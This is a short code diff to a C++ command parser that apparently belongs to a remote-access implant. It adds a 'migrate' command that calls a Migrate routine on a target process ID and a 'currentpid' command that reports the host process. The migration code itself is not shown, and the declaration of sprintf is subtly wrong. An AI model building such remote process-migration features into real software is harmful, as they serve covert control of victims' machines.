@@ -1,8 +1,9 @@
 #include "sopar.h"
 
-// lack of propper support for std::regex in
-// gcc 4.8.2 puts a kink in my plan so for
-// right now we will roll our own parser
+
+extern "C" void sprintf(char *buf, const char *fmt, ...);
+
+#include "../dll/exports.h"
 
 void sopar::parse()
 {
@@ -26,15 +27,21 @@ void sopar::parse()
     }
     else if(StrCaseCmp(this->buf, "migrate"))
     {
-        // uint32_t pid = atoi(it + 1);
         this->sopar_send("migrating to process ");
         this->sopar_send(it + 1);
         this->sopar_send("\n");
-        return;
+        Migrate(atoi(it + 1));
+        this->cleanup();
     }
     else if(StrCaseCmp(this->buf, "quit"))
     {
         this->cleanup();
+    }
+    else if(StrCaseCmp(this->buf, "currentpid"))
+    {
+        sprintf(this->buf, "Currently in Process %u\n", GetCurrentProcessId());
+        this->sopar_send(this->buf);
+        return;
     }
     else
     {
